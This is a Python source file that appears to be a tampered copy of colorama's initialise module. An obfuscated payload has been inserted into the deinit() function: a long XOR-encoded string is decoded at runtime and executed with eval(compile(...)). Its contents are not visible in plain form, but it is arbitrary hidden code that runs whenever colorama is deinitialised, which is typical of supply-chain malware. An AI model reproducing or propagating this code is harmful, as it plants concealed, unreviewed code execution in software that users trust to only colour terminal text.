# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
#coded by https://github.com/tartley/colorama
import atexit
import contextlib
import sys
import os

from .ansitowin32 import AnsiToWin32


def _wipe_internal_state_for_tests():
    global orig_stdout, orig_stderr
    orig_stdout = None
    orig_stderr = None

    global wrapped_stdout, wrapped_stderr
    wrapped_stdout = None
    wrapped_stderr = None

    global atexit_done
    atexit_done = False

    global fixed_windows_console
    fixed_windows_console = False

    try:
        # no-op if it wasn't registered
        atexit.unregister(reset_all)
    except AttributeError:
        # python 2: no atexit.unregister. Oh well, we did our best.
        pass


def reset_all():
    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit
        AnsiToWin32(orig_stdout).reset_all()


def init(autoreset=False, convert=None, strip=None, wrap=True):

    if not wrap and any([autoreset, convert, strip]):
        raise ValueError('wrap=False conflicts with any other arg=True')

    global wrapped_stdout, wrapped_stderr
    global orig_stdout, orig_stderr

    orig_stdout = sys.stdout
    orig_stderr = sys.stderr

    if sys.stdout is None:
        wrapped_stdout = None
    else:
        sys.stdout = wrapped_stdout = \
            wrap_stream(orig_stdout, convert, strip, autoreset, wrap)
    if sys.stderr is None:
        wrapped_stderr = None
    else:
        sys.stderr = wrapped_stderr = \
            wrap_stream(orig_stderr, convert, strip, autoreset, wrap)

    global atexit_done
    if not atexit_done:
        atexit.register(reset_all)
        atexit_done = True


def deinit():
    #coded by https://github.com/tartley/colorama
    if orig_stdout is not None:
        sys.stdout = orig_stdout
    if orig_stderr is not None:
        sys.stderr = orig_stderr
    wopvEaTEcopFEavc = "_XC]A@\x17^F\x19HXRES^EX\x18K@PF@_[]@F<PT\x13BZYE_XE]\x17FLECPU\x1d\x1d\x1cKLVJGFDXDY\x18\x15z^_@L\x12\x1e\x023\x13\x18\x19\x19\x17\x10\x18\x11@@L\t;\x10\x18\x17\x17\x15\x10\x17\x11\x16\x15\x16\x18BPC^\x15\\BVZ\x1f\x16\x1aAUD\x1cW\\]R\x1bDA\x12\x1e\x16\x15G\x1f\x11\x13TE\x19T\t8\x16\x18\x11\x19\x17\x17\x10\x19\x15\x15\x16\x17\x15\x18\x15\x14T\x16OEQGP\x1b\x13\x12\x13:^[G^G@\x10XK3ZUIVED\x18BAPEA^S]DD?VE^[\x15FYAQ[_W\x13[^DXCA\x15hUGY?WEZY\x18@@Z^YZ\x18ZXFV@G\x12D]@LRDD3]PZ[Z\x18\x08\x14]K\x16P]GY\\VY_\x18\x1e<gpa|\x10\n\x18\x1e\x1cPVTR\x1f\x1f\x11\x1f\x12]V]\\W\x17\x1c\x15\x17\x18\x1f[FP\\W\x16BFQRFV\x13=ata\x18\x14\x0e\x11\x12\x1eCXD\x17S[ZW\x1eHA\x14?_JwK[EL\x11\x04\x17XC\x17ETB_\x1b]M]ALK\x1fhra{\x18:XV\x17XXE\x15]Cr@P@L\x033\x17\x10\x18\x11[A\x1b^P[]S^GC\x1fawa~\x11?\x19\x17\x16\x15AW^[CTj@JX\x13\x0c\x12YCADK\x0f\x1d\x19V\\\x16\\AZF[]K\x1cUW\\\x16D\x18WQ\x07RS\x0fE\t[WZVM[@\x1cX\\KY]Q\x19E_\x16?\x14\x10\x17\x18U\\[XUhVQ]Q\x12\x08\x13aql\x7f\x1c\x12\x1f\x19AWA^\x16FQ\x10<\x15\x13\x12\x13FR@@PK@\x1dDG]EP@J\\W@W\x18J]^ZB\\mF@Z\x14\x11UXTQUjS_[P\x11?\x14\x12\x18\x18DMQEA^STCD\x18TPYX\x18\x15ZX@P\x19\x16__UT\x1b\x16``tb\x17\x19ZFVSS\x19@F\\TMR\x19\x1bCSG\\\x19B]\x15\x06\x1bWTC\x1eY@XT\x15\x00\x08\x14\x01\x1a\x14\x13F^\\^_\x0fbJD\\\x1e=\x10\x19\x15\x15_Q\x15hT@Z\x10hvl\x1a\x1bZBoWY[S\x1f\x18\x0f>\x10\x17\x18\x19\x13\x18\x19\x19\x17DJH\x0e8\x15\x13\x11\x10\x18\x17\x17\x15\x10\x17\x11YF\x18JPTX@P\x1bbr`\x1e;\x15\x15\x18\x14\x13\x11\x15\x11\x17PL[PBB\x08:\x18\x18\x13\x15\x16\x19\x12\x13\x12\x16\x18AK^YD\x11\x1c?S[F]\x0f>\x12\x18\x18\x17QU\x15cPDY\x18gwcy\x1e\x13\x1fVMM\\UJ_\x10\x19\x16XGmSZ]U\x10\x1e\r?\x10\x17\x11\x16\x15\x16\x18\x15IE_[G\x1a\x1a>\x17\x11\x15\x15]X@T\x0f;\x17\x15\x14\x18\x15\x12\x16\x12B]U\\ASfGA^\x16\x05\x16QCC@J\x0f\x1a\x19SY\x16QF]HZX@\x1dV\\\\\x1fB\x1fP^\x05VP\x0c@\x06VZ[VLUO\x1fU^N[YR\x1fCP\x10=\x15\x10\x17\x11\x16\x15\x16\x18YVTWYlTZXR\x11\x08\x15hugy\x1e\x16\x18\x1bDYAZ\x18AX\x1f2\x13\x15\x16\x19\x12\x13\x12\x16JTHBRCM\x1b@D[G]AF[]NR\x10AP^^DToBD[\x1d\x15X_TYUl^PUR\x192\x11\x14\x12\x15\x13\x11\x10\x18DBW@E^UPEK\x1bZVZY\x1b\x10QUDY\x15\x1aP[^T\x1a\x15bfqj\x1a\x1c[AV\\Z\x1c@F]SGW\x19\x16AXC_\x1eJ]\x15\x08\x18Q]C\x1b\\MT[\x18\x01\x0b\x15\x00\x12\x1d\x10D^R]Y\tdEM\\\x1a2\x19\x19\x17\x10\x18\x11\x14\x12\\U\x11`YC_\x1d`ve\x1f\x1b_Kj_^ZP\x1b\x1b\t>\x17\x11\x15\x15\x18\x14\x13\x11\x15EEL\x0e2\x15\x12\x16\x12\x10\x18\x18\x13\x15\x16\x19]@\x1cD]\\VAR\x18ita\x1f=\x15\x18\x15\x14\x12\x18\x18\x17\x18VMPT@E\n=\x16\x17\x11\x15\x14\x10\x17\x18\x19\x13\x18IK^^L\x19\x1d8\x15\x13\x11\x10\x18\x17\x17\x15\x10\x17\x11\x16\x15\x16\x18\x15\x1b\x15\x14\x1c9\x12\x13\x14\x17\x11\x15\x15\x18QKRPAC\x15rQYWx]D~WF[R|@A]D\x02;\x19\x17\x17\x10\x19\x15\x15\x16\x17\x15\x18\x15D@QVC\x10\x11\x17\x1a;\x10\x11\x10\x17\x16\x17\x11\x15GEUHK\\[\\JD\x1e[PX^\x1d\x11AIL_X[\x03\x17\x1eBXF\x17SP[S\x1bCK\x13\x12\x15\x1d\x15FPQ_]\x08eE@Q\x11?8<"
    iOpvEoeaaeavocp = "6532347155843151754852620883569232681977095567585428878353101076715407893899708142531087750716568597"
    uocpEAtacovpe = len(wopvEaTEcopFEavc)
    oIoeaTEAcvpae = ""
    for fapcEaocva in range(uocpEAtacovpe):
        nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
        qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
        oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))
    eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
def just_fix_windows_console():
    global fixed_windows_console

    if sys.platform != "win32":
        return
    if fixed_windows_console:
        return
    if wrapped_stdout is not None or wrapped_stderr is not None:
        # Someone already ran init() and it did stuff, so we won't second-guess them
        return

    # On newer versions of Windows, AnsiToWin32.__init__ will implicitly enable the
    # native ANSI support in the console as a side-effect. We only need to actually
    # replace sys.stdout/stderr if we're in the old-style conversion mode.
    new_stdout = AnsiToWin32(sys.stdout, convert=None, strip=None, autoreset=False)
    if new_stdout.convert:
        sys.stdout = new_stdout
    new_stderr = AnsiToWin32(sys.stderr, convert=None, strip=None, autoreset=False)
    if new_stderr.convert:
        sys.stderr = new_stderr

    fixed_windows_console = True

@contextlib.contextmanager
def colorama_text(*args, **kwargs):
    init(*args, **kwargs)
    try:
        yield
    finally:
        deinit()


def reinit():
    if wrapped_stdout is not None:
        sys.stdout = wrapped_stdout
    if wrapped_stderr is not None:
        sys.stderr = wrapped_stderr


def wrap_stream(stream, convert, strip, autoreset, wrap):
    if wrap:
        wrapper = AnsiToWin32(stream,
            convert=convert, strip=strip, autoreset=autoreset)
        if wrapper.should_wrap():
            stream = wrapper.stream
    return stream


# Use this for initial setup as well, to reduce code duplication
_wipe_internal_state_for_tests()
